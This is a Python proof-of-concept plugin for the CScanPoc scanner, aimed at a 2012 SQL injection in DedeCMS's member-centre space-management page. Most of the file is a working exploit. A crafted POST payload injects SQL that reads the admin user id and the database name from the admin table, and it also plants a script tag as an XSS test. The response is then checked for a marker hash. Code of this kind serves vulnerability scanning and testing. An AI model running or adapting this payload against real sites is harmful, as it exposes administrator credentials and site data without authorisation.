# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0031'  # 平台漏洞编号，留空
    name = 'DedeCMS会员中心空间管理SQL注射'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-12-30'  # 漏洞公布时间
    desc = '''
        DedeCMS会员中心空间管理SQL注射0day漏洞,成功利用该漏洞可获得管理员密码.
        需要能使用引号，危害也不大。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/301/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '240a4173-d507-4883-94de-b2603bbfe44e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/member/edit_space_info.php?dopost=save&pagesize=120&oldspacelogo=/de/uploads/userup/3/eee.jpg%27and%20@%60%27%60,spacelogo=%28select%20concat%28userid,0x3a,md5(c),database()%29%20from%20%60%23@__admin%60%20limit%201%29,spacename='<script>alert(999)</script>',sign=%27c4rp3nt3r"
            url = self.target + payload
            r = requests.post(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
